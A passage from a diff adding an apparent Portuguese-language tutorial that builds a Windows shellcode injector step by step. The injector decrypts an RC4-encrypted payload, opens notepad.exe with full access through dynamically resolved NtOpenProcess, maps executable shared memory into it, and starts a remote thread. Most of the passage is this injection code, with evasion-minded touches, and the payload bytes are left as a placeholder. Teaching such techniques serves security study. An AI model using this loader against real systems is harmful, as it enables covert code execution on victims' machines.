+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao mapear a visão do arquivo.&quot;</span> &lt;&lt; std::endl;
+    estado = FALSE;
+    <span class="hljs-keyword">goto</span> FimDaFuncao;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">MapViewOfFile</span>: Com essa função, estou mapeando o objeto
+                            de arquivo que criei para o espaço de memória do meu processo. Isso me dá acesso direto à
+                            memória onde eu poderei copiar o payload. O <span
+                                style="color: #9E2525;">FILE_MAP_WRITE</span> me garante permissão para escrever na
+                            memória mapeada.<br></p>
+                        <p>E se essa operação falhar, a execução também é interrompida, com uma mensagem de erro sendo
+                            exibida.</p>
+                        <p><strong>Cópia do Payload</strong><br><br>Agora que a memória foi mapeada para o meu processo
+                            local, o próximo passo é copiar o payload para essa área de memória:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-built_in">memcpy</span>(enderecoLocal, payload, tamanhoPayload);
+</pre>
+                        <br>
+                        <p>Aqui, simplesmente utilizo a função <span style="color: #9E2525;">memcpy</span> para copiar o
+                            conteúdo do payload para o endereço de memória local que foi mapeado anteriormente.</p>
+                        <p><strong>Mapeamento Remoto da Memória</strong><br><br>O próximo passo, e o mais importante, é
+                            mapear essa memória compartilhada no processo remoto, onde o payload será injetado:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">enderecoMapeamentoRemoto = <span class="hljs-built_in">MapViewOfFile2</span>(handleMapeamentoArquivo, handleProcesso, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE);
+<span class="hljs-keyword">if</span> (enderecoMapeamentoRemoto == <span class="hljs-literal">NULL</span>) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao mapear a visão do arquivo remoto.&quot;</span> &lt;&lt; std::endl;
+    estado = FALSE;
+    <span class="hljs-keyword">goto</span> FimDaFuncao;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">MapViewOfFile2</span>: Aqui eu utilizo essa função para mapear
+                            o mesmo objeto de memória no espaço de endereço do processo remoto, usando o <span
+                                style="color: #9E2525;">handleProcesso</span> que recebi como argumento. Se a operação
+                            for bem-sucedida, a variável <span style="color: #9E2525;">enderecoMapeamentoRemoto</span>
+                            conterá o endereço remoto onde o payload foi mapeado.<br></p>
+                        <p>E se o mapeamento falhar, eu trato o erro da mesma maneira que os anteriores.</p>
+                        <p><strong>Finalização</strong><br><br>Por fim, termino a função armazenando o endereço remoto
+                            no ponteiro de saída <span style="color: #9E2525;">enderecoRemoto</span>, fecho o handle do
+                            mapeamento de arquivo e retorno o status final da função:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">FimDaFuncao:
+*enderecoRemoto = enderecoMapeamentoRemoto;
+<span class="hljs-keyword">if</span> (handleMapeamentoArquivo)
+    <span class="hljs-built_in">CloseHandle</span>(handleMapeamentoArquivo);
+<span class="hljs-keyword">return</span> estado;
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">enderecoRemoto</span>: Aqui, salvo o endereço remoto resultante
+                            da operação de mapeamento. Isso é importante, pois o processo que chamou essa função pode
+                            querer saber onde o payload foi injetado.<br><br><span
+                                style="color: #9E2525;">CloseHandle</span>: Sempre que trabalhar com handles no Windows,
+                            é uma boa prática garantir que eles sejam fechados corretamente após o uso. Aqui, eu fecho o
+                            handle do objeto de mapeamento de arquivo para liberar os recursos.<br></p>
+                        <p>A função, por fim, retorna o valor booleano <span style="color: #9E2525;">estado</span>, que
+                            indicará ao chamador se a operação foi bem-sucedida ou não.</p>
+                        <p>Agora vamos falar sobre nossa função <span
+                                style="color: #9E2525;">ObterHandleProcesso</span>:<br><br>A função chamada
+                            ObterHandleProcesso, tem a seguinte forma:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-function">BOOL <span class="hljs-title">ObterHandleProcesso</span><span class="hljs-params">(IN LPCWSTR nomeProcesso, OUT DWORD* idProcesso, OUT HANDLE* handleProcesso, NtOpenProcess_t NtOpenProcess)</span></span>;
+</pre>
+                        <br>
+                        <p>Essa função tem o objetivo de obter o handle de um processo com base no nome de um executável
+                            que está em execução no sistema. Aqui, eu passo o nome do processo como entrada e retorno o
+                            handle desse processo, além de seu identificador. Vou detalhar cada um dos parâmetros da
+                            função:</p>
+                        <p><span style="color: #9E2525;">nomeProcesso</span>: Esse é o nome do processo que estou
+                            procurando, passado como uma string wide (<span
+                                style="color: #9E2525;">LPCWSTR</span>).<br><span
+                                style="color: #9E2525;">idProcesso</span>: Um ponteiro de saída que armazenará o
+                            identificador (ID) do processo encontrado.<br><span
+                                style="color: #9E2525;">handleProcesso</span>: Um ponteiro de saída que armazenará o
+                            handle do processo após encontrá-lo e abri-lo com sucesso.<br><span
+                                style="color: #9E2525;">NtOpenProcess</span>: Uma função (<span
+                                style="color: #9E2525;">NtOpenProcess_t</span>) que utilizo para abrir o processo de
+                            forma mais direta, em vez de usar a função padrão do Windows <span
+                                style="color: #9E2525;">OpenProcess</span>.<br>A função retorna um valor booleano (<span
+                                style="color: #9E2525;">TRUE</span> ou <span style="color: #9E2525;">FALSE</span>) que
+                            me informa se a operação foi bem-sucedida ou não.</p>
+                        <p><strong>Variáveis Locais</strong><br><br>Vou explicar as variáveis que uso na função:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">HANDLE handleSnapshot = <span class="hljs-literal">NULL</span>;
+PROCESSENTRY32 entradaProcesso;
+entradaProcesso.dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">handleSnapshot</span>: Esse é um handle para o snapshot dos
+                            processos que eu crio usando a função <span
+                                style="color: #9E2525;">CreateToolhelp32Snapshot</span>. Esse snapshot é essencial para
+                            listar todos os processos em execução no sistema e identificar o que estou
+                            procurando.<br><br><span style="color: #9E2525;">entradaProcesso</span>: Esta estrutura
+                            contém informações sobre cada processo retornado pelo snapshot. A variável <span
+                                style="color: #9E2525;">dwSize</span> é configurada para o tamanho da estrutura <span
+                                style="color: #9E2525;">PROCESSENTRY32</span>, como exigido pela API do Windows.<br></p>
+                        <p><strong>Fluxo de Execução</strong><br></p>
+                        <p>Agora, vou explicar detalhadamente o fluxo de execução dessa parte do código.<br><br>Criação
+                            do Snapshot de Processos<br></p>
+                        <p>O primeiro passo que faço na função é capturar um snapshot de todos os processos em execução
+                            no sistema:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">handleSnapshot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-literal">NULL</span>);
+<span class="hljs-keyword">if</span> (handleSnapshot == INVALID_HANDLE_VALUE) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao criar snapshot do processo.&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">goto</span> FimDaFuncao;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">CreateToolhelp32Snapshot</span>: Aqui, crio um snapshot de
+                            todos os processos do sistema usando o flag <span
+                                style="color: #9E2525;">TH32CS_SNAPPROCESS</span>. Isso me permite enumerar todos os
+                            processos que estão em execução no momento. Caso o snapshot não seja criado com sucesso,
+                            defino o estado de erro, mostro uma mensagem de erro e vou direto para o final da função,
+                            onde trato a limpeza de recursos.<br></p>
+                        <p><strong>Obtenção do Primeiro Processo no Snapshot</strong><br><br>Depois de criar o snapshot,
+                            precisamos começar a iterar sobre os processos listados:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">Process32First</span>(handleSnapshot, &amp;entradaProcesso)) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao obter o primeiro processo.&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">goto</span> FimDaFuncao;
+    <span class="hljs-keyword">return</span> FALSE;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">Process32First</span>: Essa função retorna o primeiro processo
+                            do snapshot. Se não conseguir obter o primeiro processo, também exibo uma mensagem de erro e
+                            termino a execução da função.<br></p>
+                        <p><strong>Iteração sobre os Processos</strong><br><br>Uma vez que eu tenha o primeiro processo,
+                            passo a iterar sobre todos os processos listados pelo snapshot:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">do</span> {
+    WCHAR nomeMinusculo[MAX_PATH * <span class="hljs-number">2</span>];
+    DWORD tamanho = <span class="hljs-built_in">lstrlenW</span>(entradaProcesso.szExeFile);
+    DWORD i = <span class="hljs-number">0</span>;
+    <span class="hljs-built_in">RtlSecureZeroMemory</span>(nomeMinusculo, MAX_PATH * <span class="hljs-number">2</span>);
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">nomeMinusculo</span>: Aqui, estou criando um buffer temporário
+                            para armazenar o nome do processo em minúsculas. O motivo disso é que, em algumas situações,
+                            a comparação de nomes de processos pode ser sensível a maiúsculas e minúsculas, então eu
+                            converto tudo para minúsculas para garantir uma comparação adequada.<br><br><span
+                                style="color: #9E2525;">RtlSecureZeroMemory</span>: Essa função é utilizada para zerar o
+                            conteúdo da variável <span style="color: #9E2525;">nomeMinusculo</span>, garantindo que não
+                            haja lixo de memória antes de usá-la.<br></p>
+                        <p><strong>Conversão do Nome do Processo para Minúsculas</strong><br><br>Agora, converto o nome
+                            do processo que está na entrada para minúsculas:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">if</span> (tamanho &lt; MAX_PATH * <span class="hljs-number">2</span>) {
+    <span class="hljs-keyword">for</span> (; i &lt; tamanho; i++)
+        nomeMinusculo[i] = (WCHAR)<span class="hljs-built_in">tolower</span>(entradaProcesso.szExeFile[i]);
+    nomeMinusculo[i] = <span class="hljs-string">&#x27;\0&#x27;</span>;
+}
+</pre>
+                        <br>
+                        <p>Aqui, percorro o nome do processo retornado pelo snapshot (<span
+                                style="color: #9E2525;">entradaProcesso.szExeFile</span>) e converto cada caractere para
+                            minúsculas. Essa conversão me ajuda a realizar uma comparação mais robusta com o nome do
+                            processo que estou procurando.<br></p>
+                        <p><strong>Comparação com o Nome do Processo Alvo</strong><br><br>Depois que converto o nome do
+                            processo atual para minúsculas, comparo com o nome do processo que estou procurando:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">if</span> (<span class="hljs-built_in">wcscmp</span>(nomeMinusculo, nomeProcesso) == <span class="hljs-number">0</span>) {
+    *idProcesso = entradaProcesso.th32ProcessID;
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">wcscmp</span>: Essa função compara duas strings wide. Se o nome
+                            do processo atual for igual ao nome que estou procurando (<span
+                                style="color: #9E2525;">nomeProcesso</span>), extraio o <span
+                                style="color: #9E2525;">ProcessID</span> e o armazeno na variável de saída <span
+                                style="color: #9E2525;">idProcesso</span>.</p>
+                        <p><strong>Abertura do Processo com <span
+                                    style="color: #9E2525;">NtOpenProcess</span></strong><br><br>Se o processo
+                            encontrado é o correto, então tento abrir esse processo usando a função <span
+                                style="color: #9E2525;">NtOpenProcess</span>:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">OBJECT_ATTRIBUTES objAttr;
+CLIENT_ID clientId;
+<span class="hljs-built_in">InitializeObjectAttributes</span>(&amp;objAttr, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);
+clientId.UniqueProcess = (HANDLE)(*idProcesso);
+clientId.UniqueThread = <span class="hljs-number">0</span>;
+
+NTSTATUS status = <span class="hljs-built_in">NtOpenProcess</span>(handleProcesso, PROCESS_ALL_ACCESS, &amp;objAttr, &amp;clientId);
+<span class="hljs-keyword">if</span> (status != <span class="hljs-number">0</span>) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha ao abrir o processo.&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">break</span>;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">NtOpenProcess</span>: Esta função, fornecida por NT
+                            (kernel-level API), é uma maneira direta de abrir o processo com o máximo de permissões
+                            (<span style="color: #9E2525;">ROCESS_ALL_ACCESS</span>). Eu utilizo isso para obter o <span
+                                style="color: #9E2525;">handleProcesso</span> com todas as permissões necessárias para
+                            futuras operações no processo remoto. Caso a abertura falhe (se <span
+                                style="color: #9E2525;">status != 0</span>), exibo uma mensagem de erro e interrompo a
+                            iteração.</p>
+                        <p><strong>Iteração Continuada</strong><br><br>Caso o processo encontrado não seja o desejado,
+                            continuo iterando sobre os demais processos usando <span
+                                style="color: #9E2525;">Process32Next</span>:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">} <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(handleSnapshot, &amp;entradaProcesso));
+</pre>
+                        <br>
+                        <p>Essa função nos permite obter o próximo processo no snapshot. Se não houver mais processos, a
+                            iteração termina.<br></p>
+                        <p><strong>Finalização</strong><br><br>Por fim, encerro a função limpando os recursos e
+                            retornando o resultado:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">FimDaFuncao:
+<span class="hljs-keyword">if</span> (handleSnapshot != <span class="hljs-literal">NULL</span>)
+    <span class="hljs-built_in">CloseHandle</span>(handleSnapshot);
+<span class="hljs-keyword">if</span> (*idProcesso == <span class="hljs-literal">NULL</span> || *handleProcesso == <span class="hljs-literal">NULL</span>)
+    <span class="hljs-keyword">return</span> FALSE;
+<span class="hljs-keyword">return</span> TRUE;
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">CloseHandle</span>: Fecho o handle do snapshot de processos,
+                            garantindo que não haja vazamentos de recursos.<br>Verificação de Saída: Verifico se tanto o
+                            <span style="color: #9E2525;">idProcesso</span> quanto o <span
+                                style="color: #9E2525;">handleProcesso</span> foram atribuídos corretamente. Se algum
+                            deles for <span style="color: #9E2525;">NULL</span>, retorno <span
+                                style="color: #9E2525;">FALSE</span>, indicando que o processo não foi encontrado ou não
+                            pôde ser aberto. Caso contrário, retorno <span style="color: #9E2525;">TRUE</span>,
+                            indicando que a função foi bem-sucedida.
+                        </p>
+                        <p><strong>Análise Detalhada da Função <span
+                                    style="color: #9E2525;">main</span></strong><br><br>A função <span
+                                style="color: #9E2525;">main</span> é o ponto de entrada do meu programa. Nela, faço
+                            todo o gerenciamento para obter o handle de um processo, injetar um payload e criar uma
+                            thread remota no processo de destino. A função segue um fluxo lógico de resolução de funções
+                            NT, decriptação de payloads, localização de processos e, finalmente, a execução do
+                            payload.<br></p>
+                        <p><strong>Declaração Inicial</strong><br><br>Começo declarando a função <span
+                                style="color: #9E2525;">NtOpenProcess</span> por meio de uma técnica comum de resolução
+                            de funções nativas de NT:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">NtOpenProcess_t NtOpenProcess = <span class="hljs-built_in">GetNtFunction</span>&lt;NtOpenProcess_t&gt;(<span class="hljs-string">&quot;NtOpenProcess&quot;</span>);
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">GetNtFunction</span>: Essa função personalizada busca resolver
+                            a função NT <span style="color: #9E2525;">NtOpenProcess</span> dinamicamente em tempo de
+                            execução. Se eu não conseguir resolver essa função, meu programa não será capaz de abrir
+                            processos com acesso total através da API nativa do Windows.<br></p>
+                        <p>Logo em seguida, verifico se a função foi carregada corretamente:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">if</span> (!NtOpenProcess) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha ao resolver uma ou mais funções da API nativa do NT.&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+</pre>
+                        <br>
+                        <p>Se <span style="color: #9E2525;">NtOpenProcess</span> for <span
+                                style="color: #9E2525;">NULL</span>, exibo uma mensagem de erro e interrompo a execução,
+                            retornando um código de falha.</p>
+                        <p><strong>Variáveis Importantes</strong><br><br>Declaro as variáveis principais que vou
+                            utilizar durante o processo:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">HANDLE processoAlvo = <span class="hljs-literal">NULL</span>, threadRemota = <span class="hljs-literal">NULL</span>;
+PVOID enderecoRemoto = <span class="hljs-literal">NULL</span>;
+DWORD idProcessoAlvo = <span class="hljs-number">0</span>;
+
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> payload[] = { <span class="hljs-number">0x00</span> };
+<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> chaveRC4[] = { <span class="hljs-number">0x00</span> };
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">processoAlvo</span>: Vai armazenar o handle do processo de
+                            destino.<br><span style="color: #9E2525;">threadRemota</span>: Handle para a thread remota
+                            que será criada.<br><span style="color: #9E2525;">enderecoRemoto</span>: Um ponteiro que vai
+                            armazenar o endereço remoto onde o payload foi injetado.<br><span
+                                style="color: #9E2525;">idProcessoAlvo:</span> O identificador do processo de
+                            destino.<br><span style="color: #9E2525;">payload</span>: Esse é o buffer contendo o payload
+                            que será injetado no processo remoto.<br><span style="color: #9E2525;">chaveRC4</span>: A
+                            chave para a decriptação do payload.</p>
+                        <br>
+                        <p><strong>Decriptação do Payload</strong><br>O próximo passo é decriptar o payload. Para isso,
+                            uso uma função chamada <span style="color: #9E2525;">RC4DEC</span>:<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">BOOL DECRYPT = <span class="hljs-built_in">RC4DEC</span>(chaveRC4, <span class="hljs-built_in">static_cast</span>&lt;PBYTE&gt;(payload), <span class="hljs-built_in">sizeof</span>(chaveRC4), <span class="hljs-built_in">sizeof</span>(payload));
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">RC4DEC</span>: Esta função é responsável por aplicar a
+                            decriptação do payload usando o algoritmo RC4. Passo a chave RC4 e o payload como
+                            parâmetros, além de seus respectivos tamanhos.<br><br>Se a decriptação falhar, interrompo a
+                            execução do programa:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-keyword">if</span> (!DECRYPT) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Falha na decriptação do payload.&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+}
+</pre>
+                        <br>
+                        <p><strong>Localização do Processo Alvo</strong><br><br>Agora, preciso localizar o processo que
+                            vou atacar (no caso, o Notepad):<br></p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Pressione Enter para localizar o processo alvo.&quot;</span> &lt;&lt; std::endl;
+std::cin.<span class="hljs-built_in">get</span>();
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">ObterHandleProcesso</span>(<span class="hljs-string">L&quot;notepad.exe&quot;</span>, &amp;idProcessoAlvo, &amp;processoAlvo, NtOpenProcess)) {
+    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">ObterHandleProcesso</span>: Utilizo essa função (analisada
+                            anteriormente) para localizar o processo <span style="color: #9E2525;">notepad.exe</span> e,
+                            se for bem-sucedido, armazeno o <span style="color: #9E2525;">idProcessoAlvo</span> e o
+                            <span style="color: #9E2525;">processoAlvo</span>. Se não conseguir localizar o processo ou
+                            abrir o handle, interrompo a execução.
+                        </p>
+                        <p>Quando o processo é encontrado com sucesso, exibo algumas informações na tela:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Processo encontrado: PID &quot;</span> &lt;&lt; idProcessoAlvo &lt;&lt; std::endl;
+std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Endereco do payload: &quot;</span> &lt;&lt; <span class="hljs-built_in">static_cast</span>&lt;<span class="hljs-type">void</span>*&gt;(payload) &lt;&lt; std::endl;
+</pre>
+                        <br>
+                        <p>Essas informações me mostram o ID do processo de destino e o endereço do payload que está
+                            prestes a ser injetado.</p>
+                        <p><strong>Injeção do Payload</strong><br><br>Depois de localizar o processo, vou para a etapa
+                            de injeção do payload:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Pressione Enter para injetar o payload.&quot;</span> &lt;&lt; std::endl;
+std::cin.<span class="hljs-built_in">get</span>();
+
+<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">InjetarPayload</span>(processoAlvo, payload, <span class="hljs-built_in">sizeof</span>(payload), &amp;enderecoRemoto)) {
+    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">InjetarPayload</span>: Essa função, explicada anteriormente,
+                            injeta o payload no processo de destino. Se a injeção falhar, interrompo a execução.</p>
+                        <p>Se a injeção for bem-sucedida, o endereço remoto onde o payload foi mapeado é exibido:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Endereco remoto apos injecao: &quot;</span> &lt;&lt; enderecoRemoto &lt;&lt; std::endl;
+</pre>
+                        <br>
+                        <p><strong>Carregamento da Função <span
+                                    style="color: #9E2525;">CreateRemoteThread</span></strong><br><br>Para executar o
+                            payload no processo remoto, preciso utilizar a função <span
+                                style="color: #9E2525;">CreateRemoteThrea</span>, que é responsável por criar uma thread
+                            remota no processo de destino. Para isso, obtenho o handle para o módulo <span
+                                style="color: #9E2525;">kernel32.dll</span> e, em seguida, o endereço da função <span
+                                style="color: #9E2525;">CreateRemoteThread</span>:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">HMODULE moduloKernel = <span class="hljs-built_in">GetModuleHandleA</span>(dllKernel);
+<span class="hljs-keyword">if</span> (moduloKernel == <span class="hljs-literal">NULL</span>) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao obter o handle para kernel32.dll&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+}
+
+CriarThreadRemota = (FuncaoThread)<span class="hljs-built_in">GetProcAddress</span>(moduloKernel, nomeFuncaoThread);
+<span class="hljs-keyword">if</span> (CriarThreadRemota == <span class="hljs-literal">NULL</span>) {
+    <span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; <span class="hljs-string">&quot;[!] Erro ao localizar a funcao CreateRemoteThread.&quot;</span> &lt;&lt; std::endl;
+    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
+}
+</pre>
+                        <br>
+                        <p><span style="color: #9E2525;">GetModuleHandleA</span>: Obtém o handle do módulo <span
+                                style="color: #9E2525;">kernel32.dll</span>, onde está localizada a função <span
+                                style="color: #9E2525;">CreateRemoteThread</span>.<br><br><span
+                                style="color: #9E2525;">GetProcAddress</span>: Recupera o endereço da função <span
+                                style="color: #9E2525;">CreateRemoteThread</span> a partir do handle do módulo.<br></p>
+                        <p><strong>Criação da Thread Remota</strong><br><br>Com o endereço da função <span
+                                style="color: #9E2525;">CreateRemoteThread</span> em mãos, crio uma thread no processo
+                            remoto, passando o endereço onde o payload foi injetado:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">threadRemota = <span class="hljs-built_in">CriarThreadRemota</span>(processoAlvo, <span class="hljs-literal">NULL</span>, (SIZE_T)<span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)enderecoRemoto, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);
+<span class="hljs-keyword">if</span> (threadRemota == <span class="hljs-literal">NULL</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+</pre>
+                        <br>
+                        <p>Se a criação da thread for bem-sucedida, exibo uma mensagem indicando sucesso:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">std::wcout &lt;&lt; <span class="hljs-string">L&quot;[+] Thread remota criada com sucesso!&quot;</span> &lt;&lt; std::endl;
+</pre>
+                        <br>
+                        <p><strong>Limpeza dos Recursos</strong><Br><br>Por fim, faço a limpeza dos handles abertos:</p>
+                        <br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-built_in">CloseHandle</span>(threadRemota);
+<span class="hljs-built_in">CloseHandle</span>(processoAlvo);
+</pre>
+                        <br>
+                        <p>Isso garante que não haja vazamento de recursos.</p>
+                        <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            Fluxo da Função Principal <span style="color: #9E2525;">(main)</span></h3>
+                        <ul>
+                            <li style="margin-left: 0;"><strong></strong>
+                                <p><strong>Carregar Funções Necessárias</strong>: Carrega a função <span
+                                        style="color: #9E2525;">NtOpenProcess</span>, que é fundamental para abrir o
+                                    processo alvo.</p>
+                            </li>
+                            <li style="margin-left: 0;"><strong></strong>
+                                <p><strong>Preparar o Payload</strong>: Define o payload como um vetor de bytes. Este
+                                    vetor deve conter o código que será injetado.</p>
+                            </li>
+                            <li style="margin-left: 0;"><strong></strong>
+                                <p><strong>Decriptar o Payload</strong>: O payload é decriptado usando <span
+                                        style="color: #9E2525;">RC4DEC</span>.</p>
+                            </li>
+                            <li style="margin-left: 0;"><strong></strong>
+                                <p><strong>Localizar o Processo</strong>: Espera a entrada do usuário e chama <span
+                                        style="color: #9E2525;">ObterHandleProcesso</span> para localizar o Notepad.</p>
+                            </li>
+                            <li style="margin-left: 0;"><strong></strong>
+                                <p><strong>Injetar o Payload</strong>: Chama a função <span
+                                        style="color: #9E2525;">InjetarPayload</span>.</p>
+                            </li>
+                            <li style="margin-left: 0;"><strong></strong>
+                                <p><strong>Criar uma Thread Remota</strong>: Cria uma nova thread que executa o código
+                                    injetado.</p>
+                            </li>
+                            <li style="margin-left: 0;"><strong></strong>
+                                <p><strong>Fechamento de Handles</strong>: Os handles abertos são fechados para liberar
+                                    recursos do sistema.</p>
+                            </li>
+                        </ul>
+                        <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+                            Código completo</h2><br>
+                        <pre
+                            style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
